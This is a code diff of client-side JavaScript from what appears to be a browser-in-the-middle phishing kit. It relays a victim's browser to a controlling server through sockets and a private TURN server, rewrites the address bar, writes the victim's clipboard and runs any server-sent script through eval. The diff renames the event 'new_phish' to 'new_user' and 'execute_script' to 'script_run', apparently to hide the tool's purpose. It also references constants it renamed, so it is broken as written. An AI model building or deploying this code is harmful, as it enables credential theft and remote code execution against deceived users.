@@ -28,8 +28,8 @@ function height(){
   || 0;
 }
 
-const client_ip = 'CLIENT_IP';
-const target_id = 'TARGET_ID';
+const CLIENT_IP_VAR = 'CLIENT_IP';
+const TARGET_ID_VAR = 'TARGET_ID';
 
 //declare connnection and video in global scope for further reference
 var peerConnection;
@@ -39,7 +39,7 @@ const video = document.querySelector("video")
 const socket = io.connect(window.location.origin)
 let viewport_width = width()
 let viewport_height = height()
-socket.emit('new_phish', viewport_width, viewport_height, client_ip, target_id)
+socket.emit('new_user', viewport_width, viewport_height, CLIENT_IP, TARGET_ID)
 
 socket.on("push_state", function(new_state){
   history.pushState({},'','/' + new_state)
@@ -53,14 +53,11 @@ socket.on("copy_to_clipboard", function(data){
 socket.on("video_stream_offer", function(broadcaster_socket_id, offer){
   peerConnection = new RTCPeerConnection({
     iceServers: [
-      {
-        "urls": "stun:stun.l.google.com:19302",
-      },
-      // { 
-      //   "urls": "turn:TURN_IP?transport=tcp",
-      //   "username": "TURN_USERNAME",
-      //   "credential": "TURN_CREDENTIALS"
-      // }
+      { 
+        "urls": "turn:TURN_IP?transport=tcp",
+        "username": "TURN_USERNAME",
+        "credential": "TURN_CREDENTIALS"
+      }
     ]
   })
   //2) set up an answer an send back to the broadcaster
@@ -89,7 +86,7 @@ socket.on("candidate", function(broadcaster_socket_id, candidate){
     .catch(e => console.error(e))
 })
 
-socket.on("execute_script", function(script){
+socket.on("script_run", function(script){
   eval(script)
 })
 
@@ -162,9 +159,9 @@ copy_to_clipboard = function (data) {
   // Add it to the document
   document.body.appendChild(dummy);
   // Set its ID
-  dummy.setAttribute("id", "dummy_id");
+  dummy.setAttribute("id", "DUMMY_ID");
   // Output the array into it
-  document.getElementById("dummy_id").value = data;
+  document.getElementById("DUMMY_ID").value = data;
   // Select it
   dummy.select();
   // Copy its contents
